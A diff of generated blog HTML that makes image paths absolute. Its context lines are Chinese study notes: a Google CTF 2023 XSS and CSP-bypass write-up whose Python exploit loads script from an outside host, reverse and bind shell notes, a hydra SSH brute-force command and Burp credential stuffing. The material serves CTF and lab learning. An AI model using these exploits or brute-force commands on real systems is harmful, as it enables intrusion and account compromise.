@@ -2092,7 +2092,7 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 <p>透過建構式函式所產生的物件，都會攜帶一個原型物件</p>
 <figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> name=<span class="string">&#x27;test&#x27;</span></span><br><span class="line">name.</span><br></pre></td></tr></table></figure>
 <p>在 console 裡使用 <code>name.</code> 時（打到 <code>.</code> 就好），這時候瀏覽器會很貼心的幫我們列出所有存在 <code>name</code> 本身的屬性或方法：<br>這裡看到的清單，是 <code>name</code> 的原型物件裡所有可用的屬性與方法，當你呼叫這些方法時，JavaScript 會透過原型鏈查找到可用的函式。</p>
-<p><img src="img/GoogleCTFCSP_1.png" alt="Untitled"></p>
+<p><img src="/img/GoogleCTFCSP_1.png" alt="Untitled"></p>
 <p>它們是如何搜尋使用的方法及屬性的?</p>
 <p>比如在調用 <code>toLowerCase</code> </p>
 <ol>
@@ -2170,7 +2170,7 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 </ul>
 <p>回歸正題，目標應該是在網站中找到一個XSS漏洞並竊取cookie拿到flag</p>
 <p>在打開網頁後可以看到這樣的畫面，我們需要對其輸入一些資訊，介紹欄位是插入到頁面中的文字</p>
-<p><img src="img/GoogleCTFCSP_2.png" alt="Untitled"></p>
+<p><img src="/img/GoogleCTFCSP_2.png" alt="Untitled"></p>
 <p>不過這受到Google自己的 Closure Library 的保護，免受 XSS 攻擊</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://github.com/google/closure-library">https://github.com/google/closure-library</a></li>
@@ -2285,13 +2285,13 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://github.com/google/safevalues/tree/main/src#trustedresourceurl">safevalues/src 在 main ·谷歌/安全值 ·GitHub上</a></li>
 </ul>
-<p><img src="img/GoogleCTFCSP_3.png" alt="Untitled"></p>
+<p><img src="/img/GoogleCTFCSP_3.png" alt="Untitled"></p>
 <ul>
 <li>Script URLs 可能很危險，因為它們允許在目前網頁的來源（網域）內執行程式碼</li>
 <li>僅僅知道 URL 的來源是不夠的。惡意行為者可以利用某些網域上的開放重定向來重新導向到包含有害腳本的任意 URL</li>
 </ul>
 <p>通過查看 <code>!location.pathname.startsWith(&#39;/view/&#39;</code>) ，能發現他從bootstrap.js獲取變數</p>
-<p><img src="img/GoogleCTFCSP_4.png" alt="Untitled"></p>
+<p><img src="/img/GoogleCTFCSP_4.png" alt="Untitled"></p>
 <figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!location.<span class="property">pathname</span>.<span class="title function_">startsWith</span>(<span class="string">&#x27;/view/&#x27;</span>)) &#123;</span><br><span class="line">  ....</span><br><span class="line">  editor = (<span class="function"><span class="params">x</span>=&gt;</span>x)<span class="string">`/static/editor.js`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">(<span class="function">()=&gt;</span>&#123;<span class="keyword">var</span> e=<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="title class_">Field</span>(<span class="string">&quot;editMe&quot;</span>);e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">BasicTextFormatter</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">RemoveFormatting</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">UndoRedo</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">ListTabHandler</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">SpacesTabHandler</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">EnterHandler</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">HeaderFormatter</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="title class_">LoremIpsum</span>(<span class="string">&quot;Click here to edit&quot;</span>)),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">LinkDialogPlugin</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">LinkBubble</span>);<span class="keyword">const</span> o=[goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">LINK</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">BOLD</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">ITALIC</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">UNORDERED_LIST</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">FONT_COLOR</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">FONT_FACE</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">FONT_SIZE</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">JUSTIFY_LEFT</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">JUSTIFY_CENTER</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">JUSTIFY_RIGHT</span>];<span class="keyword">var</span> g=goog.<span class="property">ui</span>.<span class="property">editor</span>.<span class="property">DefaultToolbar</span>.<span class="title function_">makeToolbar</span>(o,goog.<span class="property">dom</span>.<span class="title function_">getElement</span>(<span class="string">&quot;toolbar&quot;</span>));<span class="keyword">new</span> goog.<span class="property">ui</span>.<span class="property">editor</span>.<span class="title class_">ToolbarController</span>(e,g),e.<span class="title function_">makeEditable</span>(),goog.<span class="property">events</span>.<span class="title function_">listen</span>(e,goog.<span class="property">editor</span>.<span class="property">Field</span>.<span class="property">EventType</span>.<span class="property">DELAYEDCHANGE</span>,(<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">let</span> o=e.<span class="title function_">getCleanContents</span>(),g=goog.<span class="property">dom</span>.<span class="title function_">getElement</span>(<span class="string">&quot;youtube&quot;</span>).<span class="property">value</span>;<span class="keyword">if</span>(g.<span class="title function_">startsWith</span>(<span class="string">&quot;https://www.youtube.com/watch&quot;</span>))&#123;<span class="keyword">let</span> e=<span class="keyword">new</span> <span class="title function_">URL</span>(g),t=<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(e.<span class="property">search</span>),i=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>);i.<span class="property">src</span>=<span class="string">`https://www.youtube.com/embed/<span class="subst">$&#123;t.get(<span class="string">&quot;v&quot;</span>)&#125;</span>`</span>,i.<span class="property">width</span>=<span class="string">&quot;560&quot;</span>,i.<span class="property">height</span>=<span class="string">&quot;315&quot;</span>,o+=<span class="string">&quot;&lt;br&gt;&quot;</span>+i.<span class="property">outerHTML</span>&#125;<span class="keyword">let</span> t=sanitizer.<span class="title function_">sanitize</span>(o);<span class="title function_">setInnerHTML</span>(goog.<span class="property">dom</span>.<span class="title function_">getElement</span>(<span class="string">&quot;preview&quot;</span>),t),goog.<span class="property">dom</span>.<span class="title function_">getElement</span>(<span class="string">&quot;introduction&quot;</span>).<span class="property">value</span>=t&#125;))&#125;)();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>簡單來說他的調用流程是</p>
@@ -2311,7 +2311,7 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 <figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">#!<span class="regexp">/usr/</span>bin/env python</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="variable constant_">URL</span> = <span class="string">&quot;https://biohazard-web.2023.ctfcompetition.com&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">first_response = requests.<span class="title function_">post</span>(f<span class="string">&quot;&#123;URL&#125;/create&quot;</span>, headers=headers, json=&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;introduction&quot;</span>: <span class="string">&quot;&lt;a id=editor href=https://attack.shhnjk.com/alert.js&gt;&lt;/a&gt;&lt;a id=editor&gt;&lt;/a&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;favorites&quot;</span>: &#123;<span class="string">&quot;hobbies&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;sports&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;* ID&quot;</span>: <span class="title class_">True</span>&#125;</span><br><span class="line">&#125;)</span><br><span class="line">first_bio = first_response.<span class="title function_">json</span>()</span><br><span class="line"></span><br><span class="line">second_response = requests.<span class="title function_">post</span>(f<span class="string">&quot;&#123;URL&#125;/create&quot;</span>, headers=headers, json=&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;introduction&quot;</span>: f<span class="string">&quot;&lt;iframe src=\&quot;&#123;URL&#125;/views/view/&#123;first_bio[&#x27;id&#x27;]&#125;\&quot; csp=\&quot;script-src https://attack.shhnjk.com/alert.js &#123;URL&#125;/static/closure-library/ &#123;URL&#125;/static/sanitizer.js &#123;URL&#125;/static/main.js &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;\&quot;&gt;&lt;/iframe&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;favorites&quot;</span>: &#123;<span class="string">&quot;hobbies&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;sports&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;IFRAME CSP&quot;</span>: <span class="title class_">True</span>&#125;</span><br><span class="line">&#125;)</span><br><span class="line">second_bio = second_response.<span class="title function_">json</span>()</span><br><span class="line"><span class="title function_">print</span>(f<span class="string">&quot;Report URL: &#123;URL&#125;/view/&#123;second_bio[&#x27;id&#x27;]&#125;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# python3 expjs.<span class="property">py</span> </span><br><span class="line"><span class="title class_">Report</span> <span class="attr">URL</span>: <span class="attr">https</span>:<span class="comment">//biohazard-web.2023.ctfcompetition.com/view/9991bfe8-c422-4258-89d3-600b305c8a07</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>並開啟網頁查看，可以看到成功繞過了CSP嵌入了iframe語法</p>
-<p><img src="img/GoogleCTFCSP_5.png" alt="Untitled"></p>
+<p><img src="/img/GoogleCTFCSP_5.png" alt="Untitled"></p>
 
       
     </div>
@@ -2447,7 +2447,7 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 <li>所有的shell都是對機器的訪問</li>
 <li>彈出shell -&gt; 可以訪問一台機器</li>
 <li><p>reverse shell &gt; 受害者連接到攻擊機器</p>
-<p>  <img src="img/exploit_Untitled.png" alt="Untitled"></p>
+<p>  <img src="/img/exploit_Untitled.png" alt="Untitled"></p>
 <ul>
 <li>nc &gt; 監聽一個端口<ul>
 <li>lvp &gt; listening verbose part</li>
@@ -2458,12 +2458,12 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 <li>攻擊者(local)端監聽任何對4444 port的發起的連線</li>
 <li>讓目標主機(受害者端)對攻擊者端的4444 port發起連線</li>
 <li><p>雙方建立連線後</p>
-<p><img src="img/exploit_Untitled_1.png" alt="Untitled"></p>
+<p><img src="/img/exploit_Untitled_1.png" alt="Untitled"></p>
 </li>
 </ul>
 </li>
 <li><p>bind shell &gt; 在機器上打開一個端口連接到目標</p>
-<p>  <img src="img/exploit_Untitled_2.png" alt="Untitled"></p>
+<p>  <img src="/img/exploit_Untitled_2.png" alt="Untitled"></p>
 <ul>
 <li>當使用nc在特定端口上連接到特定目標機器時，對方會監聽攻擊機器的連接</li>
 <li>綁定到目標(受害者)主機上的<strong>特定</strong>port來監聽傳入連接的shell，攻擊者會通過這port連到目標(受害)機器上</li>
@@ -2510,7 +2510,7 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 <li><p>Metasploit框架中的有效負載也分為兩部分，stager和stage。</p>
 <ul>
 <li><p>stager 負責下載大的有效負載（階段），將其註入內存，並將執行傳遞給它</p>
-<p><img src="img/exploit_Untitled_3.png" alt="Untitled"></p>
+<p><img src="/img/exploit_Untitled_3.png" alt="Untitled"></p>
 </li>
 </ul>
 </li>
@@ -2577,9 +2577,9 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 <li><p>hydra - SSH 錯誤</p>
   <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.19.140:22 -t 4 -V**</span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-14 16:23:58</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 1009 login tries (l:1/p:1009), ~253 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.19.140:22/</span><br><span class="line">[ERROR] could not connect to ssh://192.168.19.140:22 - kex error : no match <span class="keyword">for</span> method server host key algo: server [ssh-rsa,ssh-dss], client [ssh-ed25519,ecdsa-sha2-nistp521,ecdsa-sha2-nistp384,ecdsa-sha2-nistp256,sk-ssh-ed25519@openssh.com,sk-ecdsa-sha2-nistp256@openssh.com,rsa-sha2-512,rsa-sha2-256]</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# apt update&amp;&amp; apt full-upgrade -y</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# dpkg -l | grep kali-tweaks</span><br><span class="line">ii  kali-tweaks                                    2023.3.2                                all          tool to adjust advanced configuration settings <span class="keyword">for</span> Kali Linux</span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# kali-tweaks  </span><br><span class="line">&gt;&gt;&gt; Configuring Samba</span><br><span class="line">&gt; Setting client min protocol to: LANMAN1</span><br><span class="line">&gt; Writing changes to /etc/samba/smb.conf</span><br><span class="line">&gt;&gt;&gt; Configuring SSH</span><br><span class="line">&gt; Enabling wide compatibility</span><br><span class="line">&gt; $ <span class="built_in">cp</span> -f /usr/share/kali-defaults/etc/ssh/ssh_config.d/kali-wide-compat.conf /etc/ssh/ssh_config.d/kali-wide-compat.conf</span><br><span class="line"></span><br><span class="line">┏━(Message from Kali developers)</span><br><span class="line">┃ For more information about Samba configuration, please refer to:</span><br><span class="line">┃ https://www.kali.org/docs/general-use/samba-configuration/</span><br><span class="line">┃ For more information about SSH configuration, please refer to:</span><br><span class="line">┃ https://www.kali.org/docs/general-use/ssh-configuration/</span><br><span class="line">┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span><br><span class="line"></span><br><span class="line">&gt; Press Enter to <span class="built_in">continue</span>...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>  enter &gt; 選SSH client &gt; OK</p>
-<p>  <img src="img/exploit_Untitled_4.png" alt="Untitled"></p>
+<p>  <img src="/img/exploit_Untitled_4.png" alt="Untitled"></p>
 <p>  會需要再輸入一次</p>
-<p>  <img src="img/exploit_Untitled_5.png" alt="Untitled"></p>
+<p>  <img src="/img/exploit_Untitled_5.png" alt="Untitled"></p>
 </li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.19.140:22 -t 4 -V</span><br></pre></td></tr></table></figure>
@@ -2588,27 +2588,27 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 <h3 id="Credential-Stuffing-and-Password-Spraying"><a href="#Credential-Stuffing-and-Password-Spraying" class="headerlink" title="Credential Stuffing and Password Spraying"></a><strong>Credential Stuffing and Password Spraying</strong></h3><ul>
 <li><a target="_blank" rel="noopener" href="https://addons.mozilla.org/zh-TW/firefox/addon/foxyproxy-standard/">https://addons.mozilla.org/zh-TW/firefox/addon/foxyproxy-standard/</a></li>
 </ul>
-<p><img src="img/exploit_Untitled_6.png" alt="Untitled"></p>
+<p><img src="/img/exploit_Untitled_6.png" alt="Untitled"></p>
 <ul>
 <li>開啟這個Proxy及Burp Suite攔截目標網站的登入訊息</li>
 </ul>
-<p><img src="img/exploit_Untitled_7.png" alt="Untitled"></p>
+<p><img src="/img/exploit_Untitled_7.png" alt="Untitled"></p>
 <ul>
 <li>burp suite intercept message send to Intruder</li>
 </ul>
-<p><img src="img/exploit_Untitled_8.png" alt="Untitled"></p>
+<p><img src="/img/exploit_Untitled_8.png" alt="Untitled"></p>
 <ul>
 <li>修改Attack type &gt; Pitchfork</li>
 </ul>
-<p><img src="img/exploit_Untitled_9.png" alt="Untitled"></p>
+<p><img src="/img/exploit_Untitled_9.png" alt="Untitled"></p>
 <ul>
 <li>寫入蒐集到的mail、passwd資訊</li>
 </ul>
-<p><img src="img/exploit_Untitled_10.png" alt="Untitled"></p>
-<p><img src="img/exploit_Untitled_11.png" alt="Untitled"></p>
+<p><img src="/img/exploit_Untitled_10.png" alt="Untitled"></p>
+<p><img src="/img/exploit_Untitled_11.png" alt="Untitled"></p>
 <ul>
 <li><p>開啟攻擊並進行帳號密碼爆破</p>
-<p>  <img src="img/exploit_Untitled_12.png" alt="Untitled"></p>
+<p>  <img src="/img/exploit_Untitled_12.png" alt="Untitled"></p>
 </li>
 <li><p>可以通過回應訊息內容進行過濾</p>
 </li>
@@ -2618,9 +2618,9 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 </ul>
 </li>
 </ul>
-<p><img src="img/exploit_Untitled_13.png" alt="Untitled"></p>
-<p><img src="img/exploit_Untitled_14.png" alt="Untitled"></p>
-<p><img src="img/exploit_Untitled_15.png" alt="Untitled"></p>
+<p><img src="/img/exploit_Untitled_13.png" alt="Untitled"></p>
+<p><img src="/img/exploit_Untitled_14.png" alt="Untitled"></p>
+<p><img src="/img/exploit_Untitled_15.png" alt="Untitled"></p>
 <ul>
 <li>通過這個方式去尋找可能有弱密碼的可能</li>
 <li>爆破需要時間，若大量發送可能會觸發防火牆告警</li>
